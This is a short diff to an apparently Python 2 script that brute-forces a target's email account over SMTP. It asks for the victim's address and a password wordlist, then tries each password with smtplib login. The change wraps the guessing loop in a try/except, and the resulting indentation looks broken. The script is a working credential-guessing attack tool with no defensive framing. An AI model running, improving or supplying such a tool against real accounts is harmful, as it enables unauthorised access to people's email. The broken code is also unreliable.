@@ -37,7 +37,8 @@ user = raw_input("Enter the target's email address: ")
 passwfile = raw_input("Enter the password file name: ")
 passwfile = open(passwfile, "r")
 
-for password in passwfile:
+try:
+	for password in passwfile:
 	try:
 		smtpserver.login(user, password)
 
@@ -45,3 +46,5 @@ for password in passwfile:
 		break;
 	except smtplib.SMTPAuthenticationError:
 		print "[!] Password Incorrect: %s" % password
+except:
+	print" Password not founded sorry.."
